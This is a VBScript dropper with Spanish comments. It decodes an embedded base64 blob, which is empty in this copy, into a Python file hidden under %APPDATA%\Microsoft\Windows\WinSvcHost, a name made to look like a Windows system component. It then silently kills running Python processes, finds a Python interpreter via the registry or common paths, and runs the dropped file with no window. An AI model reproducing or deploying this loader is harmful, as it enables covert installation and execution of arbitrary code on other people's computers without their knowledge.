Set fso = CreateObject("Scripting.FileSystemObject")
Set sh  = CreateObject("WScript.Shell")

appdata = sh.ExpandEnvironmentStrings("%APPDATA%")
dest    = appdata & "\Microsoft\Windows\WinSvcHost"
pyfile  = dest & "\WinSvcHost.py"

If Not fso.FolderExists(dest) Then fso.CreateFolder(dest)

' Siempre sobreescribir el servidor
Dim b64
b64 = ""
Set objXML  = CreateObject("MSXML2.DOMDocument")
Set objNode = objXML.createElement("b64")
objNode.dataType = "bin.base64"
objNode.text = b64
Set objStream = CreateObject("ADODB.Stream")
objStream.Type = 1
objStream.Open
objStream.Write objNode.nodeTypedValue
objStream.SaveToFile pyfile, 2
objStream.Close

' Matar proceso Python viejo silenciosamente
sh.Run "taskkill /F /IM pythonw.exe /T", 0, False
sh.Run "taskkill /F /IM python.exe /T", 0, False

WScript.Sleep 1500

' Buscar Python en todos los lugares posibles
Dim pyPath
pyPath = ""
On Error Resume Next

' Registro maquina
Dim versions(8)
versions(0) = "3.12"
versions(1) = "3.11"  
versions(2) = "3.10"
versions(3) = "3.9"
versions(4) = "3.8"
versions(5) = "3"
versions(6) = "3.13"
versions(7) = "3.7"
versions(8) = "3.6"

Dim i
For i = 0 To 8
    If pyPath = "" Then
        pyPath = sh.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\Python\PythonCore\" & versions(i) & "\InstallPath\")
    End If
    If pyPath = "" Then
        pyPath = sh.RegRead("HKEY_CURRENT_USER\SOFTWARE\Python\PythonCore\" & versions(i) & "\InstallPath\")
    End If
    If pyPath = "" Then
        pyPath = sh.RegRead("HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Python\PythonCore\" & versions(i) & "\InstallPath\")
    End If
Next

' Buscar en rutas comunes si no se encontro en registro
If pyPath = "" Then
    Dim commonPaths(10)
    commonPaths(0)  = "C:\Python312\"
    commonPaths(1)  = "C:\Python311\"
    commonPaths(2)  = "C:\Python310\"
    commonPaths(3)  = "C:\Python39\"
    commonPaths(4)  = "C:\Users\" & sh.ExpandEnvironmentStrings("%USERNAME%") & "\AppData\Local\Programs\Python\Python312\"
    commonPaths(5)  = "C:\Users\" & sh.ExpandEnvironmentStrings("%USERNAME%") & "\AppData\Local\Programs\Python\Python311\"
    commonPaths(6)  = "C:\Users\" & sh.ExpandEnvironmentStrings("%USERNAME%") & "\AppData\Local\Programs\Python\Python310\"
    commonPaths(7)  = "C:\Users\" & sh.ExpandEnvironmentStrings("%USERNAME%") & "\anaconda3\"
    commonPaths(8)  = "C:\Users\" & sh.ExpandEnvironmentStrings("%USERNAME%") & "\miniconda3\"
    commonPaths(9)  = "C:\ProgramData\Anaconda3\"
    commonPaths(10) = "C:\ProgramData\miniconda3\"
    
    Dim j
    For j = 0 To 10
        If pyPath = "" Then
            If fso.FileExists(commonPaths(j) & "pythonw.exe") Then
                pyPath = commonPaths(j)
            End If
        End If
    Next
End If

On Error GoTo 0

If pyPath <> "" Then
    Dim exe
    exe = pyPath & "pythonw.exe"
    If Not fso.FileExists(exe) Then exe = pyPath & "python.exe"
    
    If fso.FileExists(exe) Then
        sh.Run Chr(34) & exe & Chr(34) & " " & Chr(34) & pyfile & Chr(34), 0, False
    End If
End If
